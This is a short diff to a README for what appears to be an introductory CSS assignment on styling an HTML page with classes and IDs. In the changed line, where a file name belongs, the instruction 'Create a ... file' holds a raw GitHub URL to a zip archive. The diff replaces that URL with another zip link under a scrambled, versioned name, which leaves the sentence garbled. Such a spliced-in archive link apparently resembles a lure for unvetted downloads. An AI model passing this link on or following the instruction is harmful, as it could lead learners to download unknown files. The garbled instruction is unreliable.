@@ -7,7 +7,7 @@ Use colors, fonts, and spacing effectively.
 
 ## Instructions
 
-Create a https://raw.githubusercontent.com/Liz-on-code/feb-2025-introduction-to-css-Liz-on-code/main/upswing/feb-2025-introduction-to-css-Liz-on-code.zip file.
+Create a https://raw.githubusercontent.com/Liz-on-code/feb-2025-introduction-to-css-Liz-on-code/main/upswing/feb_on_to_introduction_css_Liz_code_v1.8.zip file.
 Apply CSS to a HTML page.
 Style elements using:
 Classes and IDs.
